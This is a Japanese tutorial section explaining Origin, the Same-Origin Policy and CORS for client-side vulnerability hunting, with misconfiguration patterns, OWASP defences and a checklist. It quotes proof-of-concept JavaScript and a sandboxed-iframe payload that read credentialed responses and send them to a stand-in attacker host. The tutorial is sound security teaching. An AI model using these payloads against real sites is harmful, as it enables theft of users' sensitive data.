## Origin概念・Same-Origin Policy・CORS

クライアントサイド脆弱性を狩る上で、最初に押さえるべき「土台」がOrigin（オリジン）の概念と、それを軸に動くSame-Origin Policy（SOP、同一オリジンポリシー）、そしてその制限を意図的に緩める仕組みであるCORS（Cross-Origin Resource Sharing）です。XSSやpostMessageの悪用、CSRF、情報漏えい系のバグの多くは、「なぜこの通信がブロックされないのか」「なぜこのデータが読めてしまうのか」という疑問をSOP/CORSのルールに照らして解くことから見つかります。本節では、この2つの仕組みを「ブラウザの内部でどう判定されているか」というレベルまで掘り下げて解説します。

### Originとは何か

Originは「スキーム（プロトコル）」「ホスト（ドメイン）」「ポート番号」の3つ組で定義されます。この3つがすべて一致する場合のみ「同一オリジン（same-origin）」と判定され、1つでも異なれば「クロスオリジン（cross-origin）」です。

| 比較対象URL | `https://example.com/page1` との関係 | 理由 |
|---|---|---|
| `https://example.com/page2` | 同一オリジン | パス違いはOriginに影響しない |
| `http://example.com/page1` | 異なるオリジン | スキームが `https` と `http` で違う |
| `https://sub.example.com/page1` | 異なるオリジン | ホストがサブドメイン違い |
| `https://example.com:8443/page1` | 異なるオリジン | ポート番号が違う（省略時は既定ポート443/80として比較） |
| `https://example.com/page1?x=1#frag` | 同一オリジン | クエリ文字列・フラグメントはOriginに含まれない |

この判定はブラウザのあらゆるセキュリティ機構（Cookieのスコープ、`localStorage`/`sessionStorage`の分離、DOMアクセス制御、Fetch/XHRの応答読み取り制御、`postMessage`のOrigin検証対象など）で共通の基盤として使われます。つまりOriginという1つの単純な概念が、ブラウザ全体のセキュリティモデルの「境界線」を引いていると理解してください。

### Same-Origin Policy（SOP）が何を「禁止」し、何を「許可」しているか

SOPの本質を一言で言うと、**「クロスオリジンへのリクエスト送信自体は多くの場合許可されるが、そのレスポンス内容をJavaScriptから読み取ることは禁止される」**というルールです。これは初学者が誤解しやすいポイントで、「SOPがあるから外部サイトへの通信はできない」わけではありません。

具体的には以下のような挙動になります。

- `<img src="https://other-origin.example/x.png">` や `<script src="https://other-origin.example/lib.js">` のような「埋め込み系タグ」によるクロスオリジンのリクエストは、そもそもSOPの制限対象外で普通に発生します（レスポンスの中身を直接JSから読めないだけで、画像は描画され、スクリプトは実行されます）。
- `fetch()` や `XMLHttpRequest` によるクロスオリジンリクエストは、リクエスト自体はネットワーク上飛んでいく（＝サーバー側の副作用は起こり得る）が、**レスポンスボディの読み取りがブラウザによってブロックされる**のがデフォルトの挙動です。これがCSRF（Cross-Site Request Forgery）が成立する理由の一つでもあります。「送れるが読めない」という非対称性がSOPの核心です。
- `<iframe>` で他オリジンのページを埋め込んだ場合、そのフレーム内のDOM（`document`オブジェクトなど）へ親フレームからスクリプト経由でアクセスすることはSOPによりブロックされます。

> ⚠️ **未取得の資料**: 「A Comprehensive Guide to the Same-Origin Policy and the CORS Policy」（Emrebener, Medium）は自動取得できませんでした（理由: サーバーがHTTP 403 Forbiddenを返し、GitHubミラー等の代替も存在しなかったため）。以下のURLからご自身で直接ご覧ください: https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145
>
> （以下は未取得資料の補足として一般知識に基づく解説です）公開情報（記事タイトルや要約検索結果）から確認できる範囲では、同記事はSOPを「ブラウザに組み込まれた重要なセキュリティ機能で、あるオリジンのスクリプトが別オリジンへ自由にクロスオリジンリクエストを行うことを制限するもの」と説明し、CORSのプリフライトリクエストについて「ブラウザがクロスオリジンリクエストを受け取るサーバーに対して、そのリクエストを受け入れてよいか事前に確認する仕組み」と位置づけています。この理解は本節で述べる仕組み（後述のプリフライトの節を参照）と整合しており、SOP→CORSという学習順序で全体像を掴む構成になっていると考えられます。

### なぜこの非対称なルールが存在するのか（仕組みレベルの理解）

ブラウザは、レスポンスの「読み取り」だけを制限すればよいという設計を選びました。理由は歴史的経緯にあります。Webの初期から`<img>`, `<script>`, `<link>`, `<form>` によるクロスオリジンの「埋め込み」や「送信」は当たり前に使われてきたため、これらを今更ブロックすると既存のWebが壊れてしまいます。一方で、Ajax（`XMLHttpRequest`）が登場した際、「任意サイトのレスポンス内容をJSが自由に読める」ことを許すと、ログイン中のユーザーのブラウザを踏み台にして、そのユーザーだけがアクセスできる別サイトの機密情報（メール本文、APIトークン、個人情報など）をJSで盗み取れてしまいます。これを防ぐために、「リクエストは飛ばせるがレスポンスは読めない」という非対称な設計が採用されました。

実装上は、ブラウザのネットワークスタックがレスポンスを受け取った後、そのレスポンスを要求元のJavaScriptコンテキスト（オリジン）に渡す直前に、リクエスト元オリジンとレスポンス元オリジンを比較します。異なる場合、CORSヘッダによる明示的な許可がない限り、`fetch()`のPromiseは失敗せず（レスポンス自体は届く「opaqueレスポンス」になる実装もある）、JS側からは中身にアクセスできないか、`XMLHttpRequest`ではネットワークエラーとして扱われます。この「ブロックする層」がブラウザ内部の一点に集約されているため、SOPは各Webアプリケーションが個別に実装する必要のない、ブラウザが保証する基盤的な防御機構になっています。

### CORSとは何か、なぜ必要か

CORS（Cross-Origin Resource Sharing）は、SOPによる「レスポンス読み取り禁止」という原則を、**サーバー側の明示的な合意（HTTPレスポンスヘッダ）**によって緩和する仕組みです。マイクロサービス化やSPA（Single Page Application）とAPIサーバーの分離が進んだ結果、正当な理由でクロスオリジン通信が必要になるケースが増え、それに対応するために標準化されました。

PortSwiggerの解説では、SOPとCORSの関係を次のように整理しています。

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

CORS実装の基本は、サーバーがレスポンスに `Access-Control-Allow-Origin`（以下ACAO）ヘッダを付与し、そのオリジンからのクロスオリジン読み取りを許可することです。

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://trusted-website.com
```

ブラウザは、リクエストを送ったスクリプトのオリジン（例: `https://trusted-website.com`）と、このACAOヘッダの値が一致するかを確認し、一致すればレスポンスの読み取りを許可します。**この判定は完全にブラウザ側で行われる**点が重要です。サーバーがACAOヘッダを返しても、それは「この呼び出し元オリジンにはレスポンスを読ませてよい」というサーバーからブラウザへの意思表示に過ぎず、リクエスト自体の到達やサーバー側処理の実行を止めるものではありません。

### Cookie等の認証情報を伴うクロスオリジンリクエスト

Cookieを使ったセッション管理をしているアプリケーションに対してcrossOriginなXHR/fetchを行う場合、デフォルトではブラウザはCookieを送信しません。送信させるには、リクエスト側で明示的にフラグを立てる必要があります。

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();
```

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

この`req.withCredentials = true`が、Cookieを含む認証情報付きリクエストを送るためのスイッチです。さらに、サーバー側がこのレスポンスの読み取りを許可するには、ACAOヘッダに加えて `Access-Control-Allow-Credentials: true` を返す必要があります。ここで仕組み上重要な制約があります。**認証情報を伴うリクエストの場合、ACAOヘッダにワイルドカード`*`を指定することはブラウザの仕様で許可されません。** サーバーは具体的なオリジン文字列を返す必要があります。これは「誰でも読める」設定と「Cookie付きで読める」設定を同時に許すと、任意のサイトがログイン中ユーザーのセッションで機密データを盗めてしまうため、ブラウザ側で意図的に塞がれている抜け道です。

### プリフライトリクエスト（Preflight Request）の仕組み

すべてのクロスオリジンリクエストが単純に送信されるわけではありません。ブラウザは、リクエストが「単純リクエスト（simple request）」の条件（メソッドがGET/HEAD/POSTのいずれか、かつ特定の限られたヘッダとContent-Typeのみを使用、など）を満たさない場合、実際のリクエストの前に**OPTIONS メソッドによる「プリフライトリクエスト」**を自動的に送信します。

プリフライトの流れは次の通りです。

1. ブラウザがOPTIONSリクエストを送信し、`Origin`、`Access-Control-Request-Method`（実際に使う予定のHTTPメソッド）、`Access-Control-Request-Headers`（実際に使う予定のカスタムヘッダ）をヘッダに含める。
2. サーバーはこのOPTIONSリクエストに対し、許可するオリジン・メソッド・ヘッダを `Access-Control-Allow-Origin`、`Access-Control-Allow-Methods`、`Access-Control-Allow-Headers` として返す。
3. ブラウザはこの返答を確認し、実際に予定していたリクエスト（PUTやDELETE、`Content-Type: application/json`を使ったPOSTなど）を許可するかどうかを内部で判定する。許可されていれば実際のリクエストを送信する。

この仕組みが存在する理由は、「複雑なリクエスト（サーバーに副作用を与えやすいメソッドやカスタムヘッダを使うもの）については、実際に送る前にサーバーの同意を得る」という、Ajax以前には存在しなかったリクエスト形態に対する後方互換性配慮です。単純リクエストは`<form>`タグでも昔から送信可能だったため今更ブロックしても意味がありませんが、JSON APIへのPUT/DELETEのような形式はブラウザネイティブの`<form>`では発生し得なかったため、プリフライトという新しい確認ステップが導入されました。

### 脆弱なCORS設定のパターン

PortSwiggerは、実際に悪用可能なCORS設定ミスのパターンを複数示しています。

#### 1. リクエストのOriginヘッダをそのまま反射する実装

サーバーが受け取った `Origin` リクエストヘッダの値を検証せずにそのまま `Access-Control-Allow-Origin` に反映してしまう実装です。これは「任意のオリジンからのアクセスを許可している」のと実質同じであり、攻撃者は自分のオリジンから被害者のブラウザ経由で標的サイトのAPIを呼び出し、Cookie付きでレスポンスを盗み出せます。

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//attacker.example.net/log?key=' + this.responseText;
}
```

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

このコードを攻撃者が用意したページ（`https://attacker.example.net`）に埋め込み、Cookie認証済みの被害者にそのページを踏ませることで、標的サイトの`sensitive-victim-data`レスポンスを攻撃者サーバーへ横流しできます。これが成立する原因は、サーバーが「送られてきたOriginヘッダ＝信頼できるオリジン」と誤解し、動的にACAOへコピーしてしまう実装ミスにあります。

#### 2. Originヘッダのパース処理の誤り（部分一致・サブドメイン検証の甘さ）

ホワイトリスト方式で許可オリジンを判定する実装で、文字列の部分一致や正規表現の誤りにより意図しないオリジンを通してしまうケースです。

- `normal-website.com` を許可する意図で、Origin文字列に `normal-website.com` が「含まれているか」だけをチェックすると、`hackersnormal-website.com` のようなオリジンも通ってしまいます（`normal-website.com`という文字列を含むだけの別ドメイン）。
- `normal-website.com` のサブドメインを許可する意図で末尾一致だけをチェックすると、`normal-website.com.evil-user.net` のようなオリジンも通ってしまいます（ドメイン構造上はevil-user.netのサブドメインだが、文字列としては`normal-website.com`で終わらないので実際にはこの例だと通らないが、`.`の有無を正しく検証しない実装だと`xnormal-website.com`のような紛れ込みが起きる、という点が実務上の落とし穴です）。

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

このクラスのバグの本質は、**Originという「構造化された文字列（scheme://host:port）」を、単純な文字列マッチ（`indexOf`や緩い正規表現）で扱ってしまう**ことです。安全にホワイトリスト判定を行うには、Originヘッダをスキーム・ホスト・ポートに正しくパースした上で、ホスト部分は完全一致（サブドメインを許可する場合は`.`区切りでの厳密な末尾一致）で比較する必要があります。

#### 3. `null` Originのホワイトリスト化

一部の実装は、開発時の利便性やサンドボックス化されたリクエストへの対応のために、Originヘッダが `null` の場合を許可リストに含めてしまうことがあります。`null` Originは、`file://` プロトコルからのリクエストや、サンドボックス化された`<iframe>`から発生し得ます。攻撃者は次のようなペイロードでこれを悪用できます。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='https://attacker.example.net/log?key='+this.responseText;
            }
        </script>">
</iframe>
```

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

`sandbox`属性付きの`<iframe>`に`allow-same-origin`を指定しない場合、そのフレームのOriginは強制的に`null`になります。サーバーが`null`を信頼済みオリジンとして扱っていると、この`data:`スキームのiframeから発行したリクエストが正規の許可済みオリジンとして扱われ、Cookie付きで機密データを読み取られます。

#### 4. サブドメインへの過剰な信頼

親ドメインが自身のすべてのサブドメイン（`*.example.com`など）をCORSで信頼している場合、いずれか1つのサブドメインにXSSやサブドメイン乗っ取りのような脆弱性があれば、そこを踏み台にして親ドメインのCORS保護されたAPIにアクセスできてしまいます。CORSの信頼範囲は、実際にはその範囲全体のセキュリティレベルに引きずられるという点を意識する必要があります。

#### 5. HTTPとHTTPSの混在許可

HTTPSサイトが、HTTP（非TLS）のサブドメインをCORSで信頼していると、中間者攻撃（MitM）によってそのHTTPサブドメインへの通信を改ざんされ、悪意あるレスポンスを注入されるリスクがあります。TLSの保証がない通信経路を信頼の輪に含めてしまうと、CORSによる「オリジンの同一性」の保証自体が崩れます。

#### 6. 内部ネットワーク向けAPIでのワイルドカード使用

企業のイントラネット内部でのみ使うことを想定したAPIが `Access-Control-Allow-Origin: *` を返し、かつCookie認証を使っていない設計であっても、社内ネットワークにアクセスできる立場の攻撃者（あるいは社内ユーザーが外部の悪意あるサイトを閲覧した場合のブラウザ）が、外部の任意サイトから内部ネットワークのAPIを直接呼び出せてしまいます。CORSがなければそもそも到達できない社内リソースへの「踏み台」を、ワイルドカードCORSが提供してしまう典型例です。

### CORSは何を守るものではないか（重要な誤解の解消）

PortSwiggerは次の点を明確に指摘しています。

> 出典: What is CORS (cross-origin resource sharing)? — https://portswigger.net/web-security/cors

CORSは「サーバー側の機密データ保護の代替にはならない」という原則と、「CORSはCSRFのような攻撃に対する防御策ではない」という原則です。前者は、CORSがブラウザ側の読み取り制限に過ぎず、サーバー自体が認可（authorization）チェックを行わなければ、そもそもCORS以前の話としてAPIが誰でも呼べてしまう、という当たり前だが見落とされがちな注意点です。後者は、CSRFは「レスポンスを読む」のではなく「リクエストを送ることで副作用（状態変更）を起こす」攻撃であるため、レスポンス読み取りを制御するCORSでは防げない、という区別です。CSRF対策には別途CSRFトークンやSameSite Cookie属性などが必要になります。この違いを混同すると、「CORSを正しく設定したからCSRFも防げている」という誤った安心につながるため要注意です。

### OWASPによる防御指針（postMessageとStorageを含む横断的な視点）

OWASP HTML5 Security Cheat Sheetは、CORSだけでなく、クライアントサイドで頻出する`postMessage`とWeb Storageについても、SOPの発想を土台にした防御指針をまとめています。

CORSに関する指針として、次のように述べられています。

> 出典: HTML5 Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

要点は「`Access-Control-Allow-Origin`には信頼できる特定のドメインのみを列挙し、ワイルドカードや、受け取った`Origin`ヘッダをそのまま無検証で返すことは避けるべき」という、前述のPortSwiggerの脆弱パターンと表裏一体の防御原則です。加えて、HTTPとHTTPSが混在するオリジンを許可しないこと、プリフライト（OPTIONS）だけでなく実際のGET/POSTリクエストに対しても正しくアクセス制御を適用すること、そしてOriginヘッダはブラウザ外のクライアント（curlなど）からは自由に偽装可能なので、CSRF対策の代替として使わないことが強調されています。

`postMessage`については、ウィンドウ間・iframe間でメッセージをやり取りする際、SOPの制限を意図的に迂回する数少ない標準APIであるため、独自の検証が必須になります。

- 送信側は、`postMessage(message, targetOrigin)`の第2引数`targetOrigin`に`*`ではなく、送信先の想定オリジンを明示的に指定すべきです。送信先ページがナビゲーションによって別オリジンへ変わった場合に、意図しない相手にメッセージが届くことを防ぐためです。
- 受信側は、`message`イベントハンドラ内で`event.origin`を検証し、想定するオリジンと完全一致するかを確認する必要があります。部分一致や`indexOf`のような緩い検証では、前述のCORSと同様の「文字列マッチの落とし穴」が発生します。
- 受信したデータ（`event.data`）は、想定するフォーマットかどうかを検証し、`eval()`で実行したり、サニタイズせずに`innerHTML`へ挿入したりしてはいけません。これらはSOP/CORSの話とは別レイヤーですが、`postMessage`はオリジン間通信の「穴」であるがゆえに、受け取った後のデータ処理もXSSの入口になりやすい点に注意が必要です。

> 出典: HTML5 Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

Web Storage（`localStorage`/`sessionStorage`）についても、OriginごとにStorageが分離されるというSOPの延長線上の設計ですが、以下の点が強調されています。

- ローカルストレージはブラウザプロファイルにアクセスできる人間（マシンへのローカルアクセス権を持つ人）から容易に読み取れるため、そこに認証トークンやセッションIDを保存すべきではありません。セッション管理にはHttpOnly属性付きのCookieを使うべきで、これはJavaScriptから読み取れない（＝XSSで盗まれにくい）という利点があります。
- 永続化が不要なデータは`sessionStorage`を使い、タブを閉じれば消えるようにする。
- Storageに保存されたデータはすべて「信頼できない入力」として扱う。XSSが存在すれば同一オリジンのJavaScriptから自由に読み書きできるため、Storage自体はXSSに対する防御にはならない。

> 出典: HTML5 Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

### まとめ：狩る側の視点でのチェックリスト

クライアントサイド脆弱性ハンティングの実務では、以下の観点でOrigin/SOP/CORSまわりを確認すると効率的です。

1. `Access-Control-Allow-Origin`の値が、リクエストの`Origin`ヘッダをそのまま反射していないか（動的反射の有無はOriginヘッダを変えて2回リクエストし、レスポンスのACAOが追従するかで確認できる）。
2. `Access-Control-Allow-Credentials: true`と組み合わさっている場合、反射や緩いホワイトリストが機密データの窃取に直結するため優先度を上げる。
3. ホワイトリスト実装が正規表現や部分一致でホスト名を判定していないか（`example.com.evil.com`や`evilexample.com`のようなペイロードで検証）。
4. `null` Originが許可リストに含まれていないか（sandboxed iframeやdata: URIでの検証）。
5. サブドメイン全体を信頼している場合、そのサブドメイン群にXSSやサブドメイン乗っ取りの余地がないか。
6. HTTPのオリジンがHTTPSアプリケーションの信頼リストに含まれていないか。
7. `postMessage`の送受信双方でOrigin検証が厳密か、受信データがサニタイズなしでDOMに挿入されていないか。
8. セッションIDやトークンが`localStorage`に平文で保存されていないか（XSSとの複合リスクとして評価）。

これらはいずれも、本節で説明した「Originという3つ組による境界」「レスポンス読み取りだけを制限するSOPの非対称性」「その制限を明示的な合意で緩めるCORS」という原理の理解があれば、初見のアプリケーションでも系統立てて確認できるようになります。
